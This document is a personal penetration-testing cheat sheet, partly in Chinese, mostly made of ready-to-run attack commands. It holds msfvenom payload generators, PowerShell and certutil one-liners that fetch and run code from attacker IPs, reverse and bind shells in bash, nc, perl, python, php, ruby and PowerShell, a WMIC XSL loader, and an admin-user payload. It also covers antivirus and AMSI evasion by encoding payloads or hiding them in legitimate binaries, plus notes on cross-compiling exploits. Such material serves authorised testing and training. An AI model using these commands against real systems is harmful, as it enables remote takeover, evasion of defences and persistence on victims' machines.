# basic

参考查询，收录大量reverse shell 和 webshell
+ https://highon.coffee/blog/reverse-shell-cheat-sheet/
+ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+ https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+ https://reverse-shell.sh/
+ https://www.revshells.com/
+ https://github.com/ShutdownRepo/shellerator
+ https://github.com/0x00-0x00/ShellPop
+ https://github.com/cybervaca/ShellReverse
+ https://liftoff.github.io/pyminifier/
+ https://github.com/xct/xc/
+ https://weibell.github.io/reverse-shell-generator/
+ https://github.com/t0thkr1s/revshellgen
+ https://github.com/mthbernardes/rsg


## 关于payload
> 常用场景
client-side attack， backdoor， stand-alone as easy method  to get a payload from one machine to another

* Non-staged 
>windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
A non-staged payload is sent in its entirety along with the exploit.
shell_xxx  

* Staged
>windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
shell/xxx 
In contrast, a staged payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.
Must caught with metatsploit(handler), nc does not work.

* Meterpreter
> a multi-function payload that can be dynamically extended at run-time.
In practice, this means that the Meterpreter shell provides more features and functionality than a regular command shell offering capabilities such as file transfer, keylogging, and various other methods of interacting with the victim machine. 
These tools are especially useful in the post-exploitation phase.

## searchsploit

```bash
searchsploit apache 2.4 | grep -v '/dos/'

# -t look title
searchsploit -t php 5.x

# searchsploit linux kernel: We're looking for exploits for the Linux kernel.
# grep -v dos: We're not interested in any Denial of Service types of attacks.
# grep '3\.': We want to look for any exploits affecting kernel versions that start with "3.".
#-(Note that we are not limiting our search to the exact version number, as that might prove to be too restrictive.)
# grep -i 'root\|privilege\|exploit': Specifically, we want exploits that deal with privilege escalation. The -i flag makes our search insensitive to case.
searchsploit linux kernel | grep -v dos | grep ' 3\.' | grep -i 'root\|privilege\|exploit'
```
## windows漏洞编号
**ms16-032**
> 如何理解微软的漏洞编号和补丁编号，微软每发布一个安全公告，就会为这个安全公告给出一个唯一的编号，格式通常为MS*-*\,比如这里的MS16-032，MS代表Microsoft，16代表2016年，032表示2016年发布的32个安全公告。

> 在安全公告可以获得的信息：受此漏洞影响的系统和漏洞的严重等级（漏洞导致的结果），不同操作系统对应的补丁，知识库的链接，漏洞的详细信息。

> KB(Knowledge Base，知识库)是微软补丁的命名方式，指的是对应微软知识库的那一篇文章，例如这里的[KB3143141](https://support.microsoft.com/en-us/help/3143141)，可以看到相关详细信息。

> 在知识库文章可以获得的信息：补丁所解决的问题，安装补丁的一些条件，其他信息等等。

> 在安全公告中，会有CVE(Common Vulnerabilities and Exposures，公共漏洞展示）编号，这里是的编号为CVE-2016-0099，CVE编号是由CVE Numbering Authorities (CNAs) ，每个CVE 有CNA机构颁发，这个机构是由美国国土安全部（DHS）网络安全和基础设施安全局（CISA）赞助，另外国内有cnnvd，这个是由中国信息安全测评中心做的，同样有类似的Cnnnvd编号，这里的编号为CNNVD-201603-080，描述的都是同一个漏洞

# windows Reverse shell

+ [hacktricks - windows shell](https://book.hacktricks.xyz/shells/shells/windows)
+ no detected: msbuild, msiexec, wmic
+ written on disk - no: powershell via smbshare, powershell one liner, mshta(IE local cache), 

## binary

### meterpreter
```bash
#-standard meterpreter, staged
//x86
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=445 -f exe -o shell_reverse.exe

//x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=445 -f exe -o shell_reverse-x64.exe

#-msf
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

#-meterpreter https
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.2 LPORT=443 -f exe -o met_https_reverse.exe

#-Non-staged
//x86
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

//x64
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#-web payload, non-staged
//asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

//jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp

//war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war

//php
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

### Non-meterpreter

```bash
#-staged
//x86
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe

//x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

//netcat不可用，需使用metasploit捕获
use exploit/multi/handler
set payload windows/shell/reverse_tcp

#-non-staged
//x86
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

//x64
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#-msf
use exploit/multi/handler
set payload windows/shell_reverse_tcp
```

### payload inject

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
```

## netcat

```bash
#Windows bind shell
nc.exe -nlvp 4444 -e cmd.exe

#Windows reverse shell
nc -lvp 443
nc.exe 192.168.1.101 443 -e cmd.exe

```

## Certutil

```bash
# Download a B64dll, decode it and execute it
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

# Download a B64exe, decode it and execute it.
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

## powershell

**常用**
```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"

Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"

echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile

# no payload written on disk; via smb share
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

**one-liner**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.3.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
```

### base64 encode
+ powershell script read file and encode to string; offensive-lab; [powershell encode b64](https://www.educba.com/powershell-base64/)
+ NiShang -- [Invoke-Encode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1), encode file
+ python [b64xfunc](https://github.com/4lph4b/b64xFunc); need to try again.
+ msfvenom [RCE on Windows – x86 vs x64 Powershell payloads](https://ivanitlearning.wordpress.com/2020/08/06/rce-on-windows-x86-vs-x64-powershell-payloads/)

```powershell
# basic code encode/decode
## encode
$Text = ‘This is a secret and should be hidden’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

## decode
$EncodedText = “VABoAGkAcwAgAGkAcwAgAGEAIABzAGUAYwByAGUAdAAgAGEAbgBkACAAcwBoAG8AdQBsAGQAIABiAGUAIABoAGkAZABlAG4A”
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText

# ps readfile and encode
## encode from file byte
$filedata= [IO.FIle]::ReadAllText("c:\tools\Invoke-PowerShellTcpOneLine_443.ps1")
[convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($filedata))

## save encoded string to file, then download and execute
powershell -nop -ep bypass -EncodedCommand "encoded code"

## down and execute
## double ' to 转义
EXEC master..xp_cmdshell 'powershell "iex(New-Object Net.WebClient).DownloadString(''http://192.168.159.10/tools/shell443.ps1'')"'

# Invoke-Encode
Invoke-Encode -DataToEncode C:\scripts\data.txt

Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine_443.ps1 -OutCommand

# python b64xfunc
b64xFunc.py -file FILE	  # Load ps1 from file
b64xFunc.py -url URL      # Load ps1 from url
b64xFunc.py -cmd "CMD"	  # Encode a single command

## kali
b64xFunc.py -file powerview.ps1 > test.ps1
b64xFunc.py -file Invoke-Kerberoast.ps1 >> test.ps1
## target
Import-Module ./test.ps1
Invoke-Kerberoast | fl

# msfvenom
## generate b64 string
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=443 --format psh --smallest | msfvenom -a x86 --platform Windows -e powershell/base64 NOEXIT
## execute
powershell.exe -W Hidden -nop -ep bypass -NoExit -E <b64 string>

msfvenom --list encoders

```


### basic script
**reverse shell**

```powershell
sudo nc -nvlp 443

//powershell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

**bind shell**

```powershell
//监听
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

//kali连接
nc -nv ip 443
```

### powercat
powershell 强化工具
[git powercat](https://github.com/besimorhino/powercat)

```bash
apt install powercat    // /usr/share/windows-resources/powercat

//windows
Load The Function From Downloaded .ps1 File:
    . .\powercat.ps1
Load The Function From URL:
    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

powercat -h

## Serve a cmd Shell:
powercat -l -p 443 -e cmd
## Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
## Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
## Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
## TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
## Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
## Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep


# download, start webserver and execute in victim
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"

powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.196/powercat.ps1');powercat -c 192.168.119.196 -p 4444 -e cmd

powershell.exe -nop -ep bypass -c  "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.196/powercat.ps1');powercat -c 192.168.119.196 -p 4444 -e cmd"
```

**reverse shell**

```bash
sudo nc -nvlp 443

powercat -c [kaliip] -p 443 -e cmd.exe

//one-liner, 下载powercat后运行
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.196/powercat.ps1');powercat -c 192.168.119.196 -p 4444 -e cmd
powershell.exe -nop -ep bypass -c  "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.196/powercat.ps1');powercat -c 192.168.119.196 -p 4444 -e cmd"
```

**bind shell**

```bash
powercat -l -p 443 -e cmd.exe

nc [winip] 443
```

**standalone payload**

```bash
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
PS C:\Users\offsec> ./reverseshell.ps1

powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
powershell.exe -E //执行
```

### nishang
+ [git](https://github.com/samratashok/nishang)
+ [常用 Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+ base64 encoded and get shell
+ change the function name and delete the help msg to bypass amsi
  
```powershell
# common usage
## append to the end of the file
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.196 -Port 1338

## Start serving the script in a web server and execute in the victim
## doesn't detect it ad malicious code(yet, 3/04/2019)
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"

## download and execute
powershell.exe -c IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.62/rev.ps1')

# encoded and get shell
## iconv utf-16LE and base64, deal with the quote things.
echo "IEX(new-object net.webclient).downloadstring('http://10.10.14.42/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

## test and wrong encoded powershell command.
powershell -enc <base64 encoded things>

# change the function name and delete the help msg to bypass amsi
```

### Empire
+ detected as malicious code
+ [git empire](https://github.com/EmpireProject/Empire)

```bash
# Create a powershell launcher, save it in a file and download and execute it.
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```

## MSIExec

```bash
# kali
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80

# target
msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```

## WMIC
Not detected by defender

```bash
wmic os get /format:"https://webserver/payload.xsl"

# example xsl file
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```


# Linux Reverse shell

online reverse shell [revshell](https://www.revshells.com/)

## Binary

### meterpreter
```
#-staged
//x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf

//x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#-Non-staged
//x86
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

//x64
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

### No-meterpreter

```
#-staged
//x86
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

//x64
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#-Non-staged
//x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

//x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

```

## Bash

```
0<&196;exec 196<>/dev/tcp/192.168.0.118/4444; sh <&196 >&196 2>&196

bash -i >& /dev/tcp/192.168.0.118/4444 0>&1
```


## Netcat

* Bind shell

```
#Linux
nc -vlp 5555 -e /bin/bash
nc 192.168.1.101 5555
```

* Reverse shell

```
#Linux
nc -lvp 5555
nc 192.168.1.101 5555 -e /bin/bash
```

* -e flag
部分nc可能不支持-e参数

```
nc -e /bin/sh ATTACKING-IP 80
/bin/sh | nc ATTACKING-IP 80

#无-e参数
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

## Telnet

```
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

## Socat

```bash
# connect to 192.168.118.8 port 18000
socat TCP:192.168.118.8:18000 EXEC:sh

```

## Scripts 
* Php

```
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

* Perl

```
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

* Ruby

```
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

* Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

* Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


# Msfvenom cheat sheet


```bash
# msfvenom help
## -i, iterator
## -e, encoder
## -s, space
## --smallest, smallest space
msfvenom -l formats
msfvenom -l encoders
search flash

# common para
-b "\x00\x0a\x0d" 
-f c 
-e x86/shikata_ga_nai -i 5 
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
-p payload
lhost lport, listen ip and port
-f format(exe,)
-o output file
-e , msf encoders;encode 绕过 av 检测
-i set the desired number of encoding interations
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
-x ， specify file to inject into 注入文件，绕过检测
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

//msfconsole  generate 
generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o test.exe

# msfconsole generate payload
use payload/windows/shell_reverse_tcp
set LPORT 5555
set LHOST 192.168.0.2
generate

generate -h

# windows
use payload/windows/exec
use payload/cmd/windows/generic
```
## windows

```bash
# reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe

# bind shell
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe

# create user
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe

# cmd shell
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe

# execute command 
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe

# encoder
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

# embedded inside executable
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

## linux

```bash
# reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

# bind shell
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf

# SunOS(Solaris)
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## web based

```bash
# php reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# Asp/x reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx

# jsp reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp

# war reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```

## Script language

```bash
# perl reverse shell
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl

# python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py

# bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```

## Mac

```bash
# reverse shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho

# bind shell
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```


# compile exploit
+ cross compile for windows and linux
+ 默认payload需要修改
+ return-address 写错
+ mem corruption exploit
  > read and excercise
  > 1. 修改ip端口
  > 2. 修改jmp esp 地址
  > 3. 修改payload


## compile on armkali
+ cross compile exploit on arm kali.
+ check this, [how to use mingw compile windows exp](https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/)

```bash
# cross compile winodes exp
## https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/
apt install mingw-w64

## check the gcc
apt-cache search mingw-w64

## compile win exp
x86_64-w64-mingw32-gcc shell.c -o shell-64.exe
i686-w64-mingw32-gcc shell.c -o shell-32.exe

# cross compile linux x86 exp
sudo apt install gcc-i686-linux-gnu
sudo apt install gcc-x86-64-linux-gnu

## compile for linux x86 32 bit
i686-linux-gnu-gcc -o setuid-x86 setuid.c

## compile for linux x86_64
x86_64-linux-gnu-gcc setuid.c -o setuid-x86_64
```

## compile on amd64
+ compile windows exploit on amd64 kali
+ compile linux 32 exploit on amd64 kali
+ [gcc compile exploit](https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c)

```bash
# cross compile for windows, on amd64 linux
sudo apt install mingw-w64

## install wine
sudo apt install wine
## wine32
dpkg --add-architecture i386 && apt-get update && apt-get install wine32

## 查看编译是否出错
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

## 编译出错，参考google建议 处理，此处添加 lws2_32
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

## compile 64 windows exp
i686-w64-mingw32-gcc exploit.c -o exploit
## compile windows exp 32bit
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32

# cross compile for linxu 32
## need gcc-multilib
apt-get install gcc-multilib
apt-get install gcc-9-base libgcc-9-dev libc6-dev

## compile for linux 32, on 64bit kali
#-m32, -Wl,--hash-style, -Wall, --static
# -m32, 32-bit compilation
# -Wl,--hash-style 
# -Wall, warning all/生成所有告警信息
# -w, no warnings
# --static, static executable
gcc -m32 exploit.c -o exploit
```

## compile error
+ 通常情况在target上编译exploit，一般不会有问题
+ 如果target上没有gcc，由于kali是 64 bit，编译需考虑target机为32 or 54.
+ use file and ldd check the compiled exploit
+ always try both shared binary and static binary
  > Sometimes, you must compile a shared binary, because a static just will not work. And sometimes, it's the opposite. A shared binary just won't work, and only a static one will. So if you want to Try Harder, you need to try BOTH.
+ get reverse shell without pty, get pty with python or run tty 
  > error: `***sh: [XXXXX: 4] tcsetattr: Invalid argument***`
+ about **shared executable**
  > only contain the code that you're actually compiling into the resulting file. All of the C library calls, like printf(), socket(), and so on, are implemented in "shared libraries". Shared libraries are stored in /usr/lib32 and other locations, and their filename always ends with .so. When the executable is run, any time a library function is called, the code is loaded from a shared library at **RUN TIME**. This means that the linker has to decide at compile time what specific library names the executable will rely on
+ about **static executable**
  > a static executable will include all of the code needed for the executable to run, libraries included. The libraries are chosen at link time. Static libraries are stored in the same locations as shared libraries, but their filenames end with .a
+ offsensive forum post about compile, worth to read. [Rooted. Comments on cross-compiling binaries for 32-bit Linux OS, and a small hint](https://forums.offensive-security.com/showthread.php?33885-Rooted-Comments-on-cross-compiling-binaries-for-32-bit-Linux-OS-and-a-small-hint "Reload this Page")

```bash
# 正常情况下
gcc xx.c -o xxx
 
# file command, check what kind of binary
root@root:> find *binary
shared-binary: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=25d71ad2477d1459ac45865dd0484c06511fd8fb, for GNU/Linux 3.2.0, not stripped
static-binary: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=74a316b99aff4e2dbbcf60771dcf7885f6cc2975, for GNU/Linux 3.2.0, not stripped

## ldd check what libraries it depends on
ldd *binary


# get reverse shell without pty
## error: ***sh: [XXXXX: 4] tcsetattr: Invalid argument***
## while try to have reverse shell without pty, not able to execute exploit
## get pty and try again, python
## run tty to check
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# compile a binary for a really old kernel
## error: ***./shared-binary: error while loading shared libraries: requires glibc 2.5 or later dynamic linker***
## need to include the following command-line argument when you compile & link your executable
## -Wl,--hash-style
## or --static
## 参考[stackoverflow](https://stackoverflow.com/questions/12075403/gcc-reduce-libc-required-version)

# others error
## error: ***gcc: error: unrecognized command-line option ‘--hash-style=both***
## no space before --hash-style
## -Wl,--hash-style

# error while exp running: ***//bin/sh: line 4: 11062 Segmentation fault***
## There is a explanation from offsec forum [Rooted. Comments on cross-compiling binaries for 32-bit Linux OS, and a small hint](https://forums.offensive-security.com/showthread.php?33885-Rooted-Comments-on-cross-compiling-binaries-for-32-bit-Linux-OS-and-a-small-hint "Reload this Page"), which is really worth to look closely.
```

